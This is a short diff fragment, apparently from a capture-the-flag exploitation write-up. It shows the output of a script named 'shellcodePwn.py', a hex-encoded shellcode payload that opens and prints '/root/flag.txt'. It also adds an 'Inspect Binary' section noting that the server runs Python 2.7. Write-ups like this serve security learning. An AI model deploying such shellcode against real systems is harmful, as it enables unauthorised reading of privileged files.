@@ -34,4 +34,13 @@ Now that it works, update "shellcodePwn.py" to read "/root/flag.txt":
     ./shellcodePwn.py 
     48b801010101010101015048b860662f75797501014831042448b82f726f6f742f666c506a02584889e731f60f0541baffffff7f4889c66a28586a015f990f05
 
+# Inspect Binary:
+
+The first thing we need to be aware of is this server is using python2, so we'll need to adjust our commands accordingly.
+
+    $ python --version
+    Python 2.7.17
+
+
+
 
